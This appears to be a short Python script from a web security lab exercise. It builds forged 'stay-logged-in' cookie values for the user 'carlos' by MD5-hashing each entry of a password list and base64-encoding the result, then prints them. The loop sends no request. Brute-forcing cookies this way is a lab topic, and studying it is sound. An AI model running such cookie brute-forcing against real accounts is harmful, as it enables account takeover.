import requests
import hashlib
import base64

passwords = open('passwords.txt','r').read().split('\n')

for password in passwords :
    md5_hash = hashlib.md5(password.encode()).hexdigest()
    final_creds = "carlos:" + md5_hash
    co_base64 = base64.b64encode(final_creds.encode()).decode()
    headers = {"Cookies" : f"stay-logged-in={co_base64}"}
    print(co_base64)
